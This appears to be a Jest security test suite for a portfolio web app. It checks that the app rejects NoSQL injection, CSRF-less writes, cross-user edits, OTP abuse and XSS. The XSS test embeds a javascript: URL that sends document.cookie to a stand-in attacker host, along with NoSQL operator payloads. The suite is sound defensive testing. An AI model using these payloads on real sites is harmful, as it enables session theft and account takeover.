process.env.NODE_ENV = 'test';
process.env.JWT_ACCESS_SECRET = 'test_access_jwt_secret_key_32chars_long!';
process.env.JWT_REFRESH_SECRET = 'test_refresh_jwt_secret_key_32chars_long!';
process.env.CSRF_SECRET = 'test_csrf_secret_key_32chars_minimum_len!';
process.env.CLIENT_URL = 'http://localhost:5173';

const request = require('supertest');
const mongoose = require('mongoose');
const { MongoMemoryServer } = require('mongodb-memory-server');
const app = require('../src/app');
const User = require('../src/models/User');
const Portfolio = require('../src/models/Portfolio');
const { hashSecret, compareSecret } = require('../src/utils/crypto');

let mongoServer;

beforeAll(async () => {
  mongoServer = await MongoMemoryServer.create();
  const uri = mongoServer.getUri();
  await mongoose.connect(uri);
});

afterAll(async () => {
  await mongoose.disconnect();
  if (mongoServer) {
    await mongoServer.stop();
  }
});

beforeEach(async () => {
  // Clear test collections
  await User.deleteMany({});
  await Portfolio.deleteMany({});
  delete process.env.TEST_SIMULATE_SMTP_ERROR;
});

describe('PHASE A: COMPREHENSIVE SECURITY & EDGE-CASE AUDIT SUITE', () => {
  // =========================================================================
  // 1. DATABASE & NOSQL INJECTION TESTS & RBAC
  // =========================================================================
  describe('1. Database, NoSQL Injection & RBAC', () => {
    it('should reject NoSQL injection payloads ($gt / $ne) on login with 400 Bad Request and sanitize operators', async () => {
      const injectionPayload = {
        email: { $gt: '' },
        password: { $ne: null },
      };

      const res = await request(app)
        .post('/api/auth/login')
        .send(injectionPayload);

      // Must be rejected by express-validator as malformed string / invalid email
      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error).toBe('Validation failed');
    });

    it('should reject NoSQL operator injection on request-otp endpoint', async () => {
      const res = await request(app)
        .post('/api/auth/request-otp')
        .send({ email: { $gt: '' } });

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
    });

    it('should enforce RBAC: User A cannot mutate or delete User B portfolio (403 Forbidden)', async () => {
      // Create User A
      const passA = await hashSecret('Password123!');
      const userA = await User.create({
        username: 'user_a',
        email: 'user_a@example.com',
        passwordHash: passA,
        role: 'user',
        isVerified: true,
      });

      // Create User B
      const passB = await hashSecret('Password456!');
      const userB = await User.create({
        username: 'user_b',
        email: 'user_b@example.com',
        passwordHash: passB,
        role: 'user',
        isVerified: true,
      });

      // Login User A to get session cookie & csrf token
      const loginRes = await request(app)
        .post('/api/auth/login')
        .send({ email: 'user_a@example.com', password: 'Password123!' });

      const authCookie = loginRes.headers['set-cookie'];

      const csrfRes = await request(app)
        .get('/api/auth/csrf-token')
        .set('Cookie', authCookie);

      const csrfToken = csrfRes.body.csrfToken;
      const csrfCookie = csrfRes.headers['set-cookie'];
      const combinedCookies = [...authCookie, ...csrfCookie];

      // User A attempts to mutate User B's portfolio document
      const maliciousMutation = await request(app)
        .put('/api/portfolio')
        .set('Cookie', combinedCookies)
        .set('x-csrf-token', csrfToken)
        .send({
          userId: userB._id.toString(), // Attacking User B
          profile: { name: 'Hacked by User A' },
        });

      expect(maliciousMutation.status).toBe(403);
      expect(maliciousMutation.body.error).toMatch(/Forbidden/i);
    });
  });

  // =========================================================================
  // 2. BACKEND MIDDLEWARE & RATE-LIMITING TESTS
  // =========================================================================
  describe('2. Backend Middleware & Rate-Limiting Tests', () => {
    it('should assert Helmet headers (CSP, X-Content-Type-Options, X-Frame-Options) are present', async () => {
      const res = await request(app).get('/api/health');

      expect(res.status).toBe(200);
      expect(res.headers).toHaveProperty('content-security-policy');
      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect(res.headers['x-frame-options']).toBe('DENY');
    });

    it('should assert CORS blocks requests from unauthorized Origin: https://evil-attacker.com', async () => {
      const res = await request(app)
        .get('/api/health')
        .set('Origin', 'https://evil-attacker.com');

      // The server either outright rejects with 403 or does not reflect evil-attacker.com in CORS header
      const allowOrigin = res.headers['access-control-allow-origin'];
      expect(allowOrigin).not.toBe('https://evil-attacker.com');
      if (res.status === 403) {
        expect(res.body.error).toMatch(/CORS blocked/i);
      }
    });

    it('should fire rapid requests at rate-limited routes and assert the 6th returns 429 Too Many Requests', async () => {
      // 1. Test strictRateLimiter on /api/auth/request-otp with test IP A
      for (let i = 0; i < 5; i++) {
        await request(app)
          .post('/api/auth/request-otp')
          .set('x-test-ip', '10.0.0.99')
          .send({ email: 'ratelimit@example.com' });
      }

      // The 6th request must exceed the max limit of 5 requests per window
      const res6Otp = await request(app)
        .post('/api/auth/request-otp')
        .set('x-test-ip', '10.0.0.99')
        .send({ email: 'ratelimit@example.com' });

      expect(res6Otp.status).toBe(429);
      expect(res6Otp.body.statusCode || res6Otp.status).toBe(429);
      expect(res6Otp.body.error).toMatch(/Too many requests/i);

      // 2. Test strictRateLimiter on /api/public/:username/contact with test IP B
      // Create developer demo1
      await User.create({
        username: 'demo1',
        email: 'demo1@codefolio.dev',
        passwordHash: 'dummyhash',
        isVerified: true,
      });

      for (let i = 0; i < 5; i++) {
        await request(app)
          .post('/api/public/demo1/contact')
          .set('x-test-ip', '10.0.0.100')
          .send({
            senderName: 'Spammer',
            senderEmail: 'spammer@example.com',
            message: 'Hello developer',
          });
      }

      const res6Contact = await request(app)
        .post('/api/public/demo1/contact')
        .set('x-test-ip', '10.0.0.100')
        .send({
          senderName: 'Spammer',
          senderEmail: 'spammer@example.com',
          message: 'Hello developer',
        });

      expect(res6Contact.status).toBe(429);
      expect(res6Contact.body.error).toMatch(/Too many requests/i);
    });
  });

  // =========================================================================
  // 3. AUTH, SESSION, JWT, CSRF & OTP SECURITY TESTS
  // =========================================================================
  describe('3. Auth, Session, JWT, CSRF & OTP Security Tests', () => {
    it('should verify password and OTP are bcrypt hashed ($2...) in User DB and never stored in plaintext', async () => {
      const signupRes = await request(app)
        .post('/api/auth/register')
        .send({
          username: 'sec_tester',
          email: 'sec_tester@example.com',
          password: 'SuperSecretPassword123!',
        });

      expect(signupRes.status).toBe(201);

      const dbUser = await User.findOne({ username: 'sec_tester' });
      expect(dbUser).not.toBeNull();

      // Password hash check: standard bcrypt starts with $2a$ or $2b$ with 12 rounds
      expect(dbUser.passwordHash).toMatch(/^\$2[ab]\$12\$/);
      expect(dbUser.passwordHash).not.toContain('SuperSecretPassword123!');

      // OTP hash check
      expect(dbUser.otpCodeHash).toMatch(/^\$2[ab]\$12\$/);
      expect(dbUser.otpExpiresAt).toBeInstanceOf(Date);
      expect(dbUser.otpExpiresAt.getTime()).toBeGreaterThan(Date.now());
    });

    it('should assert JWT is strictly placed inside Set-Cookie with HttpOnly; Secure; SameSite=Strict and NOT in body', async () => {
      // Create verified user
      const passHash = await hashSecret('ValidLoginPass123!');
      await User.create({
        username: 'cookie_tester',
        email: 'cookie_tester@example.com',
        passwordHash: passHash,
        isVerified: true,
        mfaEnabled: false,
      });

      const res = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'cookie_tester@example.com',
          password: 'ValidLoginPass123!',
        });

      expect(res.status).toBe(200);

      // Assert token is NOT returned in response body for localStorage
      expect(res.body.token).toBeUndefined();
      expect(res.body.accessToken).toBeUndefined();
      expect(res.body.jwt).toBeUndefined();

      // Assert cookies in header
      const cookies = res.headers['set-cookie'];
      expect(cookies).toBeDefined();

      const accessCookie = cookies.find((c) => c.startsWith('accessToken='));
      expect(accessCookie).toBeDefined();
      expect(accessCookie).toMatch(/HttpOnly/i);
      expect(accessCookie).toMatch(/Secure/i);
      expect(accessCookie).toMatch(/SameSite=Strict/i);
    });

    it('should assert PUT /api/portfolio without a valid CSRF header/token returns 403 Forbidden', async () => {
      const passHash = await hashSecret('CsrfTestPass123!');
      const user = await User.create({
        username: 'csrf_victim',
        email: 'csrf_victim@example.com',
        passwordHash: passHash,
        isVerified: true,
        mfaEnabled: false,
      });

      // Login to get auth cookie
      const loginRes = await request(app)
        .post('/api/auth/login')
        .send({ email: 'csrf_victim@example.com', password: 'CsrfTestPass123!' });

      const authCookie = loginRes.headers['set-cookie'];

      // Attempt state mutation without CSRF token
      const noCsrfRes = await request(app)
        .put('/api/portfolio')
        .set('Cookie', authCookie)
        .send({ profile: { bio: 'Malicious update without CSRF' } });

      expect(noCsrfRes.status).toBe(403);
      expect(noCsrfRes.body.error).toMatch(/CSRF/i);
    });

    it('should handle OTP Edge Cases: 5 wrong attempts trigger lockout, expired OTP is rejected, replayed OTP is rejected', async () => {
      const passHash = await hashSecret('OtpTestPass123!');
      const plainOtp = '482910';
      const otpHash = await hashSecret(plainOtp);

      const user = await User.create({
        username: 'otp_edge_user',
        email: 'otp_edge@example.com',
        passwordHash: passHash,
        otpCodeHash: otpHash,
        otpExpiresAt: new Date(Date.now() + 5 * 60 * 1000), // 5 min
        otpAttempts: 0,
        isVerified: false,
      });

      // 1. Test 5 wrong OTP attempts
      for (let i = 1; i <= 4; i++) {
        const wrongRes = await request(app)
          .post('/api/auth/verify-otp')
          .send({ email: 'otp_edge@example.com', otp: '111111' });

        expect(wrongRes.status).toBe(400);
        expect(wrongRes.body.attemptsRemaining).toBe(5 - i);
      }

      // 5th wrong attempt triggers lockout
      const fifthRes = await request(app)
        .post('/api/auth/verify-otp')
        .send({ email: 'otp_edge@example.com', otp: '111111' });

      expect(fifthRes.status).toBe(429);
      expect(fifthRes.body.error).toMatch(/locked/i);

      // Verify DB record shows lockout
      const lockedUser = await User.findById(user._id);
      expect(lockedUser.otpLockoutUntil).toBeInstanceOf(Date);
      expect(lockedUser.otpLockoutUntil.getTime()).toBeGreaterThan(Date.now());

      // 2. Test Expired OTP
      // Reset lockout and set expired time
      lockedUser.otpLockoutUntil = null;
      lockedUser.otpCodeHash = await hashSecret('999999');
      lockedUser.otpExpiresAt = new Date(Date.now() - 60 * 1000); // 1 minute in the past
      await lockedUser.save();

      const expiredRes = await request(app)
        .post('/api/auth/verify-otp')
        .send({ email: 'otp_edge@example.com', otp: '999999' });

      expect(expiredRes.status).toBe(400);
      expect(expiredRes.body.error).toMatch(/expired/i);

      // 3. Test OTP Replay rejection
      // Set fresh active OTP
      const freshOtp = '777888';
      lockedUser.otpCodeHash = await hashSecret(freshOtp);
      lockedUser.otpExpiresAt = new Date(Date.now() + 5 * 60 * 1000);
      lockedUser.otpAttempts = 0;
      await lockedUser.save();

      // First verification succeeds
      const firstVerify = await request(app)
        .post('/api/auth/verify-otp')
        .send({ email: 'otp_edge@example.com', otp: freshOtp });

      expect(firstVerify.status).toBe(200);
      expect(firstVerify.body.success).toBe(true);

      // Immediate second attempt with same OTP must be rejected
      const replayVerify = await request(app)
        .post('/api/auth/verify-otp')
        .send({ email: 'otp_edge@example.com', otp: freshOtp });

      expect(replayVerify.status).toBe(400);
      expect(replayVerify.body.error).toMatch(/No active OTP|already been used/i);
    });

    it('should enforce authenticated password change with current password verification, bcrypt hashing and CSRF', async () => {
      const passHash = await hashSecret('OldSecretPassword123!');
      const user = await User.create({
        username: 'pwd_changer',
        email: 'pwd_changer@example.com',
        passwordHash: passHash,
        isVerified: true,
        mfaEnabled: false,
      });

      // 1. Unauthenticated request should be rejected (401)
      const unauthRes = await request(app)
        .put('/api/auth/password')
        .send({ currentPassword: 'OldSecretPassword123!', newPassword: 'NewSecretPassword123!' });
      expect(unauthRes.status).toBe(401);

      // Login to get auth session cookies
      const loginRes = await request(app)
        .post('/api/auth/login')
        .send({ email: 'pwd_changer@example.com', password: 'OldSecretPassword123!' });

      const authCookies = loginRes.headers['set-cookie'];

      // Get CSRF token
      const csrfRes = await request(app)
        .get('/api/auth/csrf-token')
        .set('Cookie', authCookies);
      const csrfToken = csrfRes.body.csrfToken;
      const allCookies = [...authCookies, ...(csrfRes.headers['set-cookie'] || [])];

      // 2. Reject incorrect current password (400)
      const wrongCurrentRes = await request(app)
        .put('/api/auth/password')
        .set('Cookie', allCookies)
        .set('x-csrf-token', csrfToken)
        .send({ currentPassword: 'WrongPassword!', newPassword: 'NewSecretPassword123!' });
      expect(wrongCurrentRes.status).toBe(400);
      expect(wrongCurrentRes.body.error).toMatch(/Current password is incorrect/i);

      // 3. Reject new password under 8 characters (400)
      const shortPwdRes = await request(app)
        .put('/api/auth/password')
        .set('Cookie', allCookies)
        .set('x-csrf-token', csrfToken)
        .send({ currentPassword: 'OldSecretPassword123!', newPassword: 'short' });
      expect(shortPwdRes.status).toBe(400);

      // 4. Reject new password identical to current (400)
      const samePwdRes = await request(app)
        .put('/api/auth/password')
        .set('Cookie', allCookies)
        .set('x-csrf-token', csrfToken)
        .send({ currentPassword: 'OldSecretPassword123!', newPassword: 'OldSecretPassword123!' });
      expect(samePwdRes.status).toBe(400);

      // 5. Successful password change
      const successRes = await request(app)
        .put('/api/auth/password')
        .set('Cookie', allCookies)
        .set('x-csrf-token', csrfToken)
        .send({ currentPassword: 'OldSecretPassword123!', newPassword: 'NewSecretPassword123!' });
      expect(successRes.status).toBe(200);
      expect(successRes.body.success).toBe(true);

      // Verify DB hash changed and matches new password
      const updatedUser = await User.findById(user._id);
      expect(await compareSecret('NewSecretPassword123!', updatedUser.passwordHash)).toBe(true);
      expect(await compareSecret('OldSecretPassword123!', updatedUser.passwordHash)).toBe(false);
    });

    it('should allow user to reset password via OTP verification (forgot password workflow)', async () => {
      const initialHash = await hashSecret('ForgottenPass123!');
      const plainOtp = '654321';
      const otpHash = await hashSecret(plainOtp);

      const user = await User.create({
        username: 'forgotten_dev',
        email: 'forgotten@example.com',
        passwordHash: initialHash,
        otpCodeHash: otpHash,
        otpExpiresAt: new Date(Date.now() + 5 * 60 * 1000),
        isVerified: true,
      });

      // 1. Rejects invalid OTP
      const wrongOtpRes = await request(app)
        .post('/api/auth/reset-password')
        .send({
          email: 'forgotten@example.com',
          otp: '000000',
          newPassword: 'BrandNewPassword123!',
        });
      expect(wrongOtpRes.status).toBe(400);
      expect(wrongOtpRes.body.error).toMatch(/Invalid OTP code/i);

      // 2. Rejects password under 8 characters
      const shortPassRes = await request(app)
        .post('/api/auth/reset-password')
        .send({
          email: 'forgotten@example.com',
          otp: plainOtp,
          newPassword: 'short',
        });
      expect(shortPassRes.status).toBe(400);

      // 3. Successfully resets password with valid OTP
      const successResetRes = await request(app)
        .post('/api/auth/reset-password')
        .send({
          email: 'forgotten@example.com',
          otp: plainOtp,
          newPassword: 'BrandNewPassword123!',
        });
      expect(successResetRes.status).toBe(200);
      expect(successResetRes.body.success).toBe(true);
      expect(successResetRes.headers['set-cookie']).toBeDefined(); // Sets auth cookies

      // Verify DB hash changed and active OTP is consumed
      const updatedUser = await User.findById(user._id);
      expect(await compareSecret('BrandNewPassword123!', updatedUser.passwordHash)).toBe(true);
      expect(await compareSecret('ForgottenPass123!', updatedUser.passwordHash)).toBe(false);
      expect(updatedUser.otpCodeHash).toBeNull();
      expect(updatedUser.otpExpiresAt).toBeNull();

      // 4. Replay attempt with same OTP fails
      const replayRes = await request(app)
        .post('/api/auth/reset-password')
        .send({
          email: 'forgotten@example.com',
          otp: plainOtp,
          newPassword: 'AnotherPassword123!',
        });
      expect(replayRes.status).toBe(400);
      expect(replayRes.body.error).toMatch(/No active OTP found/i);
    });
  });

  // =========================================================================
  // 4. COMPREHENSIVE EDGE CASES & RESILIENCY
  // =========================================================================
  describe('4. Comprehensive Edge Cases & Fail-Safe Resiliency', () => {
    it('should reject registration attempts with reserved usernames (admin, api, login, dashboard, settings, user, public)', async () => {
      const reservedNames = ['admin', 'api', 'login', 'dashboard', 'settings', 'user', 'public'];

      for (const username of reservedNames) {
        const res = await request(app)
          .post('/api/auth/register')
          .send({
            username,
            email: `${username}@test.dev`,
            password: 'ValidPassword123!',
          });

        expect(res.status).toBe(400);
        expect(res.body.success).toBe(false);
      }
    });

    it('should render empty / partial portfolio without throwing TypeError: Cannot read properties of undefined', async () => {
      // Register user with 0 projects, 0 skills, empty bio
      const pass = await hashSecret('Pass123456!');
      const newUser = await User.create({
        username: 'empty_user',
        email: 'empty_user@example.com',
        passwordHash: pass,
        isVerified: true,
        templateId: 'minimalist',
      });

      await Portfolio.create({
        userId: newUser._id,
        profile: { name: '', bio: '', socialLinks: {} },
        skills: { frontend: [], backend: [], devops: [] },
        projects: [],
      });

      const res = await request(app).get('/api/public/empty_user');

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.portfolio.projects).toEqual([]);
      expect(res.body.data.portfolio.skills.frontend).toEqual([]);
      expect(res.body.data.portfolio.profile.bio).toBe('');
      expect(res.body.data.user.email).toBeUndefined(); // Email stripped
      expect(res.body.data.user.passwordHash).toBeUndefined(); // Passwords stripped
    });

    it('should reject oversized payloads (e.g. 100+ skills or 50,000-character bio)', async () => {
      const pass = await hashSecret('Pass123456!');
      const user = await User.create({
        username: 'boundary_tester',
        email: 'boundary@example.com',
        passwordHash: pass,
        isVerified: true,
      });

      const loginRes = await request(app)
        .post('/api/auth/login')
        .send({ email: 'boundary@example.com', password: 'Pass123456!' });

      const authCookie = loginRes.headers['set-cookie'];

      const csrfRes = await request(app)
        .get('/api/auth/csrf-token')
        .set('Cookie', authCookie);

      const csrfToken = csrfRes.body.csrfToken;
      const csrfCookie = csrfRes.headers['set-cookie'];
      const combinedCookies = [...authCookie, ...csrfCookie];

      // Oversized 50k char bio
      const massiveBio = 'A'.repeat(50000);
      const bioRes = await request(app)
        .put('/api/portfolio')
        .set('Cookie', combinedCookies)
        .set('x-csrf-token', csrfToken)
        .send({
          profile: { bio: massiveBio },
        });

      expect(bioRes.status).toBe(400);
      expect(bioRes.body.error).toBe('Validation failed');

      // Oversized array: 100+ skills
      const massiveSkills = Array.from({ length: 105 }, (_, i) => `Skill${i}`);
      const skillsRes = await request(app)
        .put('/api/portfolio')
        .set('Cookie', combinedCookies)
        .set('x-csrf-token', csrfToken)
        .send({
          skills: { frontend: massiveSkills },
        });

      expect(skillsRes.status).toBe(400);
      expect(skillsRes.body.error).toBe('Validation failed');
    });

    it('should reject javascript: protocol URL injections in portfolio projects and links', async () => {
      const pass = await hashSecret('Pass123456!');
      const user = await User.create({
        username: 'xss_tester',
        email: 'xss@example.com',
        passwordHash: pass,
        isVerified: true,
      });

      const loginRes = await request(app)
        .post('/api/auth/login')
        .send({ email: 'xss@example.com', password: 'Pass123456!' });

      const authCookie = loginRes.headers['set-cookie'];
      const csrfRes = await request(app)
        .get('/api/auth/csrf-token')
        .set('Cookie', authCookie);
      const csrfToken = csrfRes.body.csrfToken;
      const combinedCookies = [...authCookie, ...csrfRes.headers['set-cookie']];

      const xssRes = await request(app)
        .put('/api/portfolio')
        .set('Cookie', combinedCookies)
        .set('x-csrf-token', csrfToken)
        .send({
          profile: {
            socialLinks: {
              github: 'javascript:alert(document.cookie)',
            },
          },
          projects: [
            {
              title: 'Exploit Project',
              liveLink: 'javascript:fetch("https://attacker.com/"+document.cookie)',
            },
          ],
        });

      expect(xssRes.status).toBe(400);
      expect(xssRes.body.error).toBe('Validation failed');
    });

    it('should return clean 503 error on SMTP fail-safe simulation instead of crashing process', async () => {
      process.env.TEST_SIMULATE_SMTP_ERROR = 'true';

      const pass = await hashSecret('Pass123456!');
      await User.create({
        username: 'smtp_tester',
        email: 'smtp_tester@example.com',
        passwordHash: pass,
        isVerified: true,
      });

      const res = await request(app)
        .post('/api/auth/request-otp')
        .send({ email: 'smtp_tester@example.com' });

      expect(res.status).toBe(503);
      expect(res.body.success).toBe(false);
      expect(res.body.error).toMatch(/Email service unavailable/i);
    });
  });

  // =========================================================================
  // 5. PRO FEATURES & CUSTOM DOMAIN RESOLUTION
  // =========================================================================
  describe('5. Pro Features & Custom Domain Resolution', () => {
    it('should successfully resolve Pro user portfolio via custom domain simulation', async () => {
      const pass = await hashSecret('ProUserPass123!');
      const proUser = await User.create({
        username: 'alex_pro',
        email: 'alex@alexpro.com',
        passwordHash: pass,
        isVerified: true,
        isPro: true,
        customDomain: 'alexpro.com',
        templateId: 'cyberpunk',
      });

      await Portfolio.create({
        userId: proUser._id,
        profile: { name: 'Alex Pro' },
        skills: { frontend: ['React'] },
        projects: [{ title: 'Pro Project' }],
      });

      const res = await request(app).get('/api/public/domain/alexpro.com');

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.user.username).toBe('alex_pro');
      expect(res.body.data.user.isPro).toBe(true);
      expect(res.body.data.user.customDomain).toBe('alexpro.com');
    });

    it('should reject non-Pro users attempting to assign customDomain with 403 Forbidden', async () => {
      const pass = await hashSecret('FreeUserPass123!');
      const freeUser = await User.create({
        username: 'free_user',
        email: 'free@example.com',
        passwordHash: pass,
        isVerified: true,
        isPro: false, // Free user
      });

      const loginRes = await request(app)
        .post('/api/auth/login')
        .send({ email: 'free@example.com', password: 'FreeUserPass123!' });

      const authCookie = loginRes.headers['set-cookie'];
      const csrfRes = await request(app)
        .get('/api/auth/csrf-token')
        .set('Cookie', authCookie);
      const csrfToken = csrfRes.body.csrfToken;
      const combinedCookies = [...authCookie, ...csrfRes.headers['set-cookie']];

      const domainRes = await request(app)
        .put('/api/portfolio')
        .set('Cookie', combinedCookies)
        .set('x-csrf-token', csrfToken)
        .send({
          customDomain: 'freeuser.com',
        });

      expect(domainRes.status).toBe(403);
      expect(domainRes.body.error).toMatch(/CodeFolio Pro/i);
    });
  });
});
